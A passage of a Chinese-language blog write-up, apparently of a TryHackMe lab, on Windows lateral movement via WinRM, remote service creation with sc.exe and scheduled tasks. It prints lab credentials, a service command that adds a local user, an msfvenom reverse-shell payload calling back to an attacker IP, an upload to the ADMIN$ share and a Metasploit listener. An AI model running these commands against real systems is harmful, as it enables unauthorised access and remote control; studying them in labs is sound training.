+** 所需的组成员身份：** 远程管理用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;远程管理员” 这个术语强调的是管理操作的方式，而不仅仅是权限。即便某个用户是本地管理员，称为 “远程管理员” 是为了区分他们是通过远程工具（如远程桌面或 PsExec）来执行管理任务的。这种表述帮助明确管理员的管理操作是通过远程手段完成的，而不是在本地直接操作&lt;/p&gt;
+&lt;p&gt;Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。&lt;/p&gt;
+&lt;p&gt;要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;winrs.exe &lt;span class=&#34;token parameter variable&#34;&gt;-u:Administrator&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p:Mypass123&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r:target&lt;/span&gt; cmd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;Administrator&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;Mypass123&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AsPlainText &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Force&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Management&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Automation&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PSCredential &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Enter-PSSession&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Computername TARGET &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Credential &lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-Command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Computername TARGET &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Credential &lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ScriptBlock &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;whoami&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用-sc远程创建服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-sc远程创建服务&#34;&gt;#&lt;/a&gt; 使用 sc 远程创建服务&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Ports: 端口：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;135/TCP, 49152-65535/TCP (DCE/RPC)&lt;br /&gt;
+135/ TCP ，49152-65535/ TCP （DCE/RPC）&lt;/li&gt;
+&lt;li&gt;445/TCP (RPC over SMB Named Pipes)&lt;br /&gt;
+ 445/ TCP （基于 SMB 命名管道的 RPC）&lt;/li&gt;
+&lt;li&gt;139/TCP (RPC over SMB Named Pipes)&lt;br /&gt;
+ 139/ TCP （基于 SMB 命名管道的 RPC）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Required Group Memberships:&lt;/strong&gt; Administrators&lt;br /&gt;
+** 所需的组成员身份：** 管理员&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。启动服务居然可以任意执行相关命令 ，因此可以看到对应也可以执行对应的命令。&lt;/p&gt;
+&lt;h5 id=&#34;ps一下相关的服务相关内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ps一下相关的服务相关内容&#34;&gt;#&lt;/a&gt; PS 一下相关的服务相关内容&lt;/h5&gt;
+&lt;h6 id=&#34;创建-windows-服务时的注意事项&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建-windows-服务时的注意事项&#34;&gt;#&lt;/a&gt; 创建 Windows 服务时的注意事项：&lt;/h6&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;权限&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。&lt;/li&gt;
+&lt;li&gt;服务的账户可以是系统账户（如 LocalSystem、NetworkService）或特定用户账户。使用系统账户时，服务具有更高的权限，但也需要谨慎，以避免潜在的安全风险。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;服务主程序&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务的主程序通常是一个可执行文件（ &lt;code&gt;.exe&lt;/code&gt; ）。这个可执行文件必须符合 Windows 服务的要求，即能够响应启动、停止、暂停等控制命令。&lt;/li&gt;
+&lt;li&gt;常用的服务主程序框架包括  &lt;code&gt;.NET&lt;/code&gt;  提供的  &lt;code&gt;ServiceBase&lt;/code&gt;  类和 Windows API 提供的服务控制函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;执行命令&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在服务启动时，你可以通过服务的主程序执行命令。通常，这些命令包括启动必要的进程、初始化资源等。&lt;/li&gt;
+&lt;li&gt;在服务中执行命令时，需要处理好可能的错误和异常，以确保服务的稳定性。例如，启动时可能需要加载配置文件、建立网络连接等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;配置和管理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务的配置通常存储在注册表中，或者通过配置文件来管理。你可以使用  &lt;code&gt;sc&lt;/code&gt;  命令、 &lt;code&gt;PowerShell&lt;/code&gt;  脚本或服务控制面板来安装、启动、停止和删除服务。&lt;/li&gt;
+&lt;li&gt;在服务中执行命令时，确保命令的路径、环境变量等配置正确，以避免服务启动失败。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;日志和监控&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务通常需要有适当的日志记录机制，以便监控其运行状态和排查故障。确保服务能够记录必要的日志信息，例如启动成功、错误信息等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用 sc 时，它会通过几种方式尝试通过 RPC 连接到服务控制管理器（SVCCTL）远程服务程序：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 其实这是 rpc 协议的连接过程，先通过对应的 EPM  端点映射&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;如果后一个连接失败，sc 将尝试通过端口 445 ( SMB ) 或 139 ( SMB over NetBIOS ) 上的 SMB 命名管道到达 SVCCTL。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png&#34; alt=&#34;svcctl via named pipe&#34; /&gt;&lt;br /&gt;
+ 所以我感觉应该是两个协议 ，一个是对应的 rpc 一个是 smb 但是对应的服务可以执行相关命令。&lt;br /&gt;
+我们可以使用以下命令创建并启动名为 “THMservice” 的服务：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell-session&#34;&gt;&lt;figcaption data-lang=&#34;Shell session&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token output&#34;&gt;sc.exe \\TARGET create THMservice binPath= &#34;net user munra Pass123 /add&#34; start= auto&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc.exe \\TARGET start THMservice&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;服务启动时将执行 “net user” 命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。&lt;/p&gt;
+&lt;p&gt;要停止并删除该服务，我们可以执行以下命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell-session&#34;&gt;&lt;figcaption data-lang=&#34;Shell session&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token output&#34;&gt;sc.exe \\TARGET stop THMservice&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc.exe \\TARGET delete THMservice&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;creating-scheduled-tasks-remotely&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#creating-scheduled-tasks-remotely&#34;&gt;#&lt;/a&gt; Creating Scheduled Tasks Remotely&lt;/h3&gt;
+&lt;p&gt;** 远程创建计划任务&lt;/p&gt;
+&lt;p&gt;我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks /s TARGET /RU &lt;span class=&#34;token string&#34;&gt;&#34;SYSTEM&#34;&lt;/span&gt; /create /tn &lt;span class=&#34;token string&#34;&gt;&#34;THMtask1&#34;&lt;/span&gt; /tr &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;command/payload to execute&gt;&#34;&lt;/span&gt; /sc ONCE /sd 01/01/1970 /st 00:00 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks /s TARGET /run /TN &lt;span class=&#34;token string&#34;&gt;&#34;THMtask1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。&lt;/p&gt;
+&lt;p&gt;由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。&lt;/p&gt;
+&lt;p&gt;最后，要删除计划任务，我们可以使用以下命令并自行清理：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;S TARGET &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;TN &lt;span class=&#34;token string&#34;&gt;&#34;THMtask1&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;DELETE &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;F&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;实战实例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实战实例&#34;&gt;#&lt;/a&gt; 实战实例&lt;/h3&gt;
+&lt;p&gt;针对特定的本地任务&lt;br /&gt;
+&lt;strong&gt; User:&lt;/strong&gt; &lt;a href=&#34;http://ZA.TRYHACKME.COM&#34;&gt;ZA.TRYHACKME.COM&lt;/a&gt;\t1_leonard.summers&lt;br /&gt;
+&lt;strong&gt; 用户：&lt;/strong&gt; &lt;a href=&#34;http://ZA.TRYHACKME.COM&#34;&gt;ZA.TRYHACKME.COM&lt;/a&gt;\t1_leonard.summers&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Password:&lt;/strong&gt; EZpass4ever&lt;br /&gt;
+&lt;strong&gt; 密码：&lt;/strong&gt; EZpass4ever&lt;/p&gt;
+&lt;p&gt;虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 &lt;code&gt;net user&lt;/code&gt;  ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持 &lt;code&gt;exe-service&lt;/code&gt;  格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。&lt;/p&gt;
+&lt;p&gt;在 Windows 中， &lt;code&gt;.exe&lt;/code&gt;  文件是可执行文件的标准扩展名，用于运行程序。而  &lt;code&gt;exe-service&lt;/code&gt;  可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;主要区别&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;.exe&lt;/code&gt;  文件&lt;/strong&gt;：直接运行的程序，用户可以通过双击打开。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Windows 服务&lt;/strong&gt;：在后台运行的程序，通常以  &lt;code&gt;Service&lt;/code&gt;  模式启动和管理。它们可以用  &lt;code&gt;sc&lt;/code&gt;  命令或服务管理工具（如服务控制面板）来安装和管理。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用 sc.exe 的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个 shell。&lt;/p&gt;
+&lt;p&gt;但是此时我们准备横向的是 THMIIS  并且此时我们已经拿到对应的相关的 THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。&lt;/p&gt;
+&lt;h5 id=&#34;ssh尝试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh尝试&#34;&gt;#&lt;/a&gt; ssh 尝试&lt;/h5&gt;
+&lt;p&gt;首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个 thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于 domain 和 internet 组 但是我目前想知道他属于哪一个 ou&lt;br /&gt;
+ 由于我发现我目前的凭证并不是管理员用户，所以我无法使用 cmdlet 和 mmc 进行收集。此时使用猎狗 sharphound&lt;/p&gt;
+&lt;p&gt;首先使用 ssh&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; t1_leonard.summers@thmiis.za.tryhackme.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;成功&lt;/p&gt;
+&lt;h5 id=&#34;psexec&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#psexec&#34;&gt;#&lt;/a&gt; psexec&lt;/h5&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;psexec64.exe &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;thmiis.za.tryhackme.com  &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; t1_leonard.summers   &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; EZpass4ever &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; cmd.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个不知道为啥一直失败&lt;/p&gt;
+&lt;h5 id=&#34;winrm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#winrm&#34;&gt;#&lt;/a&gt; winrm&lt;/h5&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;winrs.exe &lt;span class=&#34;token parameter variable&#34;&gt;-u:t1_leonard.summers&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p:EZpass4ever&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r:thmiis.za.tryhackme.com&lt;/span&gt;  cmd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;scexe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scexe&#34;&gt;#&lt;/a&gt; sc.exe&lt;/h5&gt;
+&lt;p&gt;windows 服务相关的内容不再赘述，我们直接生成对应的 exe-service&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/shell/reverse_tcp &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe-service &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10.50&lt;/span&gt;.148.56 &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; k1t0service.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;smbclient &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;put k1t0service.exe&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-U&lt;/span&gt; t1_leonard.summers &lt;span class=&#34;token parameter variable&#34;&gt;-W&lt;/span&gt; ZA &lt;span class=&#34;token string&#34;&gt;&#39;//thmiis.za.tryhackme.com/admin$/&#39;&lt;/span&gt; EZpass4ever&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907213326.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自 &lt;code&gt;msfconsole&lt;/code&gt;  的反向 shell：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user@AttackBox$ msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; LHOST lateralmovement&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/shell/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; exploit &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.16:4444&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;由于 &lt;code&gt;sc.exe&lt;/code&gt;  不允许我们在命令中指定凭据，因此我们需要使用 &lt;code&gt;runas&lt;/code&gt;  来生成带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能通过 SSH 访问机器，所以如果我们尝试类似的操作  &lt;code&gt;runas /netonly /user:ZA\t1_leonard.summers cmd.exe&lt;/code&gt;  ，新的命令提示符将在用户的会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：&lt;br /&gt;
+其实这句话看似很难理解，其实仔细想一想真的很难理解吗？ HAHAH 其实只是因为啥呢？只是因为我们是用攻击盒进行渗透的。所以如果说我们 runas 之后 /netonly 我们在盒子上是看不到这个 cmd 会话的&lt;/p&gt;
